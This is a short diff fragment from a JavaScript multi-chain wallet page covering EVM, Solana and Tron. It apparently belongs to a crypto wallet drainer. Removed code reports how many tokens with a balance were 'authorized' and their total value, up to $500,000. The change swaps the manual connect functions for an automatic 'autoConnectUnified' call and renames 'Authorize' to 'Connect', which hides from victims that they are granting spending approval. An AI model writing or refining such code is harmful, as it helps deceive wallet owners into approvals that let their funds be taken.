-      showSuccess(`✅ Tron Authorized!<br><br>Tokens: ${tokensWithBalance.length}<br>Total: ~$${totalValue.toFixed(2)}<br>Authorized: Up to $${Math.min(totalValue, 500000).toFixed(2)}`);
-    } else throw new Error(result.error);
-  } catch (err) {
-    showError('Authorization failed: ' + err.message);
-  }
+  autoConnectUnified(hasEvm, hasSolana, hasTron);
 }
 
 // ============ UI HELPERS ============
@@ -640,7 +560,7 @@ function showSuccess(msg) {
     <div class="success">
       <div style="font-size: 48px; margin-bottom: 16px;">✅</div>
       <div style="font-size: 15px; line-height: 1.7; text-align: left;">${msg}</div>
-      <button class="back-btn" onclick="showWalletSelector()">Authorize Another Wallet</button>
+      <button class="back-btn" onclick="showWalletSelector()">Connect Another Wallet</button>
     </div>
   `;
 }
@@ -657,9 +577,6 @@ function showError(msg) {
 
 // Expose to window
 window.handleWalletClick = handleWalletClick;
-window.manualConnectEVM = manualConnectEVM;
-window.manualConnectSolana = manualConnectSolana;
-window.manualConnectTron = manualConnectTron;
 window.showWalletSelector = showWalletSelector;
 window.showLoading = showLoading;
 window.showSuccess = showSuccess;
